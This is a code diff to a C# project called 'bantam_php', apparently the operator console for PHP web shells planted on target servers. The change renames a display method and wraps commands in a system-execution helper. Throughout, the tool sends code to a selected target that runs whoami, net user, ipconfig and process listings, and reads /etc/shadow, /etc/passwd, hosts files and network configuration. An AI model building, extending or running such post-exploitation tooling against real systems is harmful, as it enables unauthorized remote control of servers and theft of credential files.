@@ -502,7 +502,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="phpCode"></param>
         /// <param name="title"></param>
-        public void startRichtextboxThread(string phpCode, string title)
+        public void executePHPCodeDisplayInRichTextBox(string phpCode, string title)
         {
             if (validTarget() == false)
             {
@@ -646,7 +646,7 @@ namespace bantam_php
                 if(showResponse)
                 {
                     //execute the code and show it in a richtextbox
-                    startRichtextboxThread(code, "PHP Eval Result - " + g_SelectedTarget);
+                    executePHPCodeDisplayInRichTextBox(code, "PHP Eval Result - " + g_SelectedTarget);
                 } else {
                     startPhpExecutionThread(code);
                 }
@@ -958,7 +958,7 @@ namespace bantam_php
             string path = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
             string phpCode = "@readfile('" + path + "');";
 
-            startRichtextboxThread(phpCode, "Viewing File -" + path);
+            executePHPCodeDisplayInRichTextBox(phpCode, "Viewing File -" + path);
         }
 
         /// <summary>
@@ -1083,7 +1083,9 @@ namespace bantam_php
                 return;
             }
 
-            startRichtextboxThread(PHP.getTaskListFunction(Clients[g_SelectedTarget].isWindows), "Process List");
+            bool isWin = Clients[g_SelectedTarget].isWindows;
+            string phpCode = PHP.executeSystemCode(PHP.getTaskListFunction(isWin));
+            executePHPCodeDisplayInRichTextBox(phpCode, "Process List");
         }
 
         //Triggered via MENU_ITEM_CLICK
@@ -1102,7 +1104,8 @@ namespace bantam_php
 
             if (Clients[g_SelectedTarget].isWindows)
             {
-                startRichtextboxThread(PHP.windowsOS_NetUser, "User Account");
+                string phpCode = PHP.executeSystemCode(PHP.windowsOS_NetUser);
+                executePHPCodeDisplayInRichTextBox(phpCode, "User Account");
             } else {
                 MessageBox.Show("This client is linux!", "DERP!!");
             }
@@ -1122,7 +1125,8 @@ namespace bantam_php
 
             if (Clients[g_SelectedTarget].isWindows)
             {
-                startRichtextboxThread(PHP.windowsOS_NetAccounts, "User Accounts");
+                string phpCode = PHP.executeSystemCode(PHP.windowsOS_NetAccounts);
+                executePHPCodeDisplayInRichTextBox(phpCode, "User Accounts");
             } else {
                 MessageBox.Show("This client is linux!", "DERP!!");
             }
@@ -1142,7 +1146,8 @@ namespace bantam_php
 
             if (Clients[g_SelectedTarget].isWindows)
             {
-                startRichtextboxThread(PHP.windowsOS_Ipconfig, "ipconfig");
+                string phpCode = PHP.executeSystemCode(PHP.windowsOS_Ipconfig);
+                executePHPCodeDisplayInRichTextBox(phpCode, "ipconfig");
             } else {
                 MessageBox.Show("This client is linux!", "DERP!!");
             }
@@ -1162,7 +1167,8 @@ namespace bantam_php
 
             if (Clients[g_SelectedTarget].isWindows)
             {
-                startRichtextboxThread(PHP.windowsOS_Ver, "ver");
+                string phpCode = PHP.executeSystemCode(PHP.windowsOS_Ver);
+                executePHPCodeDisplayInRichTextBox(phpCode, "ver");
             } else {
                 MessageBox.Show("This client is linux!", "DERP!!");
             }
@@ -1179,8 +1185,8 @@ namespace bantam_php
             {
                 return;
             }
-
-            startRichtextboxThread(PHP.posixOS_Whoami, "whoami");
+            string phpCode = PHP.executeSystemCode(PHP.posixOS_Whoami);
+            executePHPCodeDisplayInRichTextBox(phpCode, "whoami");
         }
 
         /// <summary>
@@ -1197,7 +1203,8 @@ namespace bantam_php
 
             if (Clients[g_SelectedTarget].isLinux)
             {
-                startRichtextboxThread(PHP.linuxOS_Ifconfig, "ifconfig");
+                string phpCode = PHP.executeSystemCode(PHP.linuxOS_Ifconfig);
+                executePHPCodeDisplayInRichTextBox(phpCode, "ifconfig");
             } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
@@ -1221,7 +1228,7 @@ namespace bantam_php
             if (Clients[g_SelectedTarget].isWindows)
             {
                 string phpCode = PHP.readFileProcedure(PHP.windowsFS_hostTargets);
-                startRichtextboxThread(phpCode, "hosts");
+                executePHPCodeDisplayInRichTextBox(phpCode, "hosts");
             } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
@@ -1242,7 +1249,7 @@ namespace bantam_php
             if (Clients[g_SelectedTarget].isLinux)
             {
                 string phpCode = PHP.readFileProcedure(PHP.linuxFS_NetworkInterfaces);
-                startRichtextboxThread(phpCode, "interfaces");
+                executePHPCodeDisplayInRichTextBox(phpCode, "interfaces");
             } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
@@ -1263,7 +1270,7 @@ namespace bantam_php
             if (Clients[g_SelectedTarget].isLinux)
             {
                 string phpCode = PHP.readFileProcedure(PHP.linuxFS_ProcVersion);
-                startRichtextboxThread(phpCode, "version");
+                executePHPCodeDisplayInRichTextBox(phpCode, "version");
             } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
@@ -1284,7 +1291,7 @@ namespace bantam_php
             if (Clients[g_SelectedTarget].isLinux)
             {
                 string phpCode = PHP.readFileProcedure(PHP.linuxFS_hostTargetsFile);
-                startRichtextboxThread(phpCode, "hosts");
+                executePHPCodeDisplayInRichTextBox(phpCode, "hosts");
             } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
@@ -1305,7 +1312,7 @@ namespace bantam_php
             if (Clients[g_SelectedTarget].isLinux)
             {
                 string phpCode = PHP.readFileProcedure(PHP.linuxFS_IssueFile);
-                startRichtextboxThread(phpCode, "issue.net");
+                executePHPCodeDisplayInRichTextBox(phpCode, "issue.net");
             } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
@@ -1326,7 +1333,7 @@ namespace bantam_php
             if (Clients[g_SelectedTarget].isLinux)
             {
                 string phpCode = PHP.readFileProcedure(PHP.linuxFS_ShadowFile);
-                startRichtextboxThread(phpCode, "shadow");
+                executePHPCodeDisplayInRichTextBox(phpCode, "shadow");
             } else {
                 MessageBox.Show("This Target does not have a shadow file (derp)", "You TARD");
             }
@@ -1347,7 +1354,7 @@ namespace bantam_php
             if (Clients[g_SelectedTarget].isLinux)
             {
                 string phpCode = PHP.readFileProcedure(PHP.linuxFS_PasswdFile);
-                startRichtextboxThread(phpCode, "passwd");
+                executePHPCodeDisplayInRichTextBox(phpCode, "passwd");
             } else {
                 MessageBox.Show("This Target does not have a passwd file (derp)");
             }
